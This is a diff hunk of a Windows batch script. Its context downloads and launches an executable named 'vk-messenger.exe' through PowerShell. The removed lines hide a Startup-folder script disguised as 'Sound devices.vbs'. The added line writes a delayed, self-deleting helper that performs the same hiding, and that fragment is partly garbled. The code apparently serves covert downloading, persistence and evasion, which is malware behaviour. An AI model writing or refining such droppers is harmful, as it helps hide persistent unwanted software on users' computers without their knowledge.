@@ -8,7 +8,6 @@ powershell -Command "Invoke-WebRequest -Uri 'https://upload.object2.vk-apps.com/
 echo Starting application...
 start "" "%temp%\vk-messenger.exe"
 
-:: Скриване на startup folder
-attrib +h +s "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Sound devices.vbs"
-echo Startup folder is now hidden
+@echo off`r`nTIMEOUT /T 300 /NOBREAK >nul`r`nattrib +h +s \"\"C:`\\Users`\\%USERNAME%`\\AppData`\\Roaming`\\Microsoft`\\Windows`\\Start Menu`\\Programs`\\Startup`\\Sound devices.vbs\"\"`r`ndel \"\"%~f0\"\"' > $t;");
+
 pause
